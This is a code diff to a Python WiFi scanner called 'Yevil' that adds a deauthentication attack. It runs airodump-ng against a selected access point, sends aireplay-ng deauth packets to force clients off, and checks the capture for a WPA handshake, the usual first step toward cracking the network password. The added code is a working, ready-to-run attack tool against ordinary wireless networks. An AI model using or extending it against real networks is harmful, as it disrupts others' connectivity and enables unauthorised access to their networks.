@@ -3,7 +3,7 @@
 Yevil - Real‑time WiFi Scanner v2.4.0
 - Curses TUI for live scanning.
 - Persistent AP summary after exit.
-- Select AP for focused scan + handshake detection.
+- Select AP for focused scan + deauth attack + handshake detection.
 """
 
 import os
@@ -252,16 +252,29 @@ def print_final_summary():
     print("\033[96m" + "=" * 80 + "\033[0m\n")
 
 # ============================================
-# TARGETED SCAN WITH HANDSHAKE DETECTION
+# TARGETED SCAN WITH DEAUTH + HANDSHAKE DETECTION
 # ============================================
 
 def run_targeted_scan(bssid, channel, interface):
-    """Launch focused airodump-ng and detect if a handshake is captured."""
+    """Launch focused scan + deauth attack, then check for handshake."""
+    # Ask for deauth count
+    try:
+        count = input("[?] Number of deauth packets to send (default 10): ").strip()
+        if count == "":
+            count = "10"
+        else:
+            count = int(count)
+            count = str(count)
+    except ValueError:
+        count = "10"
+        print("[!] Invalid input, using default 10.")
+
+    # Prepare capture filenames
     cap_prefix = f"/tmp/yevil_handshake_{bssid.replace(':', '_')}"
     cap_file = f"{cap_prefix}-01.cap"
     csv_file = f"{cap_prefix}-01.csv"
 
-    # Clean old files
+    # Remove old files
     for f in [cap_file, csv_file]:
         if os.path.exists(f):
             try:
@@ -269,32 +282,43 @@ def run_targeted_scan(bssid, channel, interface):
             except:
                 pass
 
-    # Start airodump-ng
+    # Start airodump-ng in the background
     cmd_airodump = [
         'sudo', 'airodump-ng',
         '--bssid', bssid,
         '-c', channel,
         '--write', cap_prefix,
-        '--output-format', 'pcap,csv',
+        '--output-format', 'pcap',
         interface
     ]
+    print(f"\n[+] Starting capture: {' '.join(cmd_airodump)}")
+    airo_proc = subprocess.Popen(cmd_airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(2)  # give it a moment to start
 
-    print(f"\n[+] Running focused scan: {' '.join(cmd_airodump)}")
-    print("[+] Press Ctrl+C to stop the scan.")
-    print("[+] The capture will be saved and analysed for a handshake.\n")
-
+    # Send deauth packets
+    cmd_deauth = [
+        'sudo', 'aireplay-ng',
+        '-0', count,
+        '-a', bssid,
+        '--ignore-negative-one',
+        interface
+    ]
+    print(f"\n[+] Sending deauth packets: {' '.join(cmd_deauth)}")
     try:
-        subprocess.run(cmd_airodump)
+        subprocess.run(cmd_deauth)
     except KeyboardInterrupt:
-        pass
+        print("\n[!] Deauth interrupted by user.")
     except Exception as e:
-        print(f"[-] Error during scan: {e}")
-        return
+        print(f"[-] Deauth error: {e}")
 
-    # Wait for files to flush
+    # Stop airodump-ng
+    print("[+] Stopping capture...")
+    airo_proc.terminate()
     time.sleep(1)
+    if airo_proc.poll() is None:
+        airo_proc.kill()
 
-    # Analyse for handshake
+    # Analyse the capture
     if os.path.exists(cap_file):
         print(f"\n[+] Analysing {cap_file} for handshake...")
         try:
@@ -303,22 +327,25 @@ def run_targeted_scan(bssid, channel, interface):
             output = result.stdout + result.stderr
 
             if 'WPA (1 handshake)' in output:
-                print("\033[92m[✅] HANDSHAKE CAPTURED SUCCESSFULLY!\033[0m")
+                print("\033[92m\n[✅] HANDSHAKE CAPTURED SUCCESSFULLY!\033[0m")
             elif 'WPA (0 handshake)' in output:
-                print("\033[93m[!] No handshake found in the capture.\033[0m")
+                print("\033[93m\n[!] No handshake found in the capture.\033[0m")
             else:
-                print("[!] Could not determine handshake status. Try longer capture or use deauth.")
+                print("\n[!] Could not determine handshake status. Try longer capture or stronger deauth.")
         except Exception as e:
             print(f"[-] Error analysing capture: {e}")
     else:
-        print("[-] No capture file found.")
+        print("[-] No capture file found. Something went wrong.")
 
-    # Optional: delete capture files after analysis
-    # clean = input("\n[?] Delete capture files? (y/n): ")
-    # if clean.lower() == 'y':
-    #     for f in [cap_file, csv_file]:
-    #         try: os.remove(f)
-    #         except: pass
+    # Optionally keep files, or delete
+    keep = input("\n[?] Keep capture files? (y/n): ")
+    if keep.lower() != 'y':
+        for f in [cap_file, csv_file]:
+            try:
+                os.remove(f)
+            except:
+                pass
+        print("[+] Capture files deleted.")
 
 # ============================================
 # MAIN EXECUTION
@@ -355,7 +382,7 @@ def main():
 
     cleanup_files()
 
-    # Launch background airodump-ng
+    # Launch background airodump-ng for the main scan
     cmd = [
         'airodump-ng', selected,
         '--band', 'abg',
@@ -368,6 +395,7 @@ def main():
     print("[*] Launching Real-time Interface...")
     time.sleep(1)
 
+    # Run Curses UI
     try:
         curses.wrapper(curses_display)
     except KeyboardInterrupt:
@@ -377,11 +405,12 @@ def main():
     finally:
         cleanup()
 
+    # Show summary
     print_final_summary()
 
-    # Target selection & handshake scan
+    # Target selection & handshake capture
     if networks:
-        print("\n[?] Enter the number of the AP to run a focused scan (or press Enter to skip):")
+        print("\n[?] Enter the number of the AP to capture a handshake (or press Enter to skip):")
         try:
             choice = input("> ").strip()
             if choice:
@@ -394,12 +423,13 @@ def main():
                     print(f"\n[+] Targeting {target['ssid']} ({target['bssid']}) on channel {target['channel']}")
                     run_targeted_scan(target['bssid'], target['channel'], selected)
                 else:
-                    print("[-] Invalid selection, skipping targeted scan.")
+                    print("[-] Invalid selection, skipping.")
         except ValueError:
             print("[-] Invalid input, skipping.")
         except KeyboardInterrupt:
-            print("\n[+] Skipped targeted scan.")
+            print("\n[+] Skipped.")
 
+    # Optional reset
     reset_choice = input("\n[?] Restore adapter to normal managed mode? (y/n): ")
     if reset_choice.lower() == 'y':
         reset_adapter()
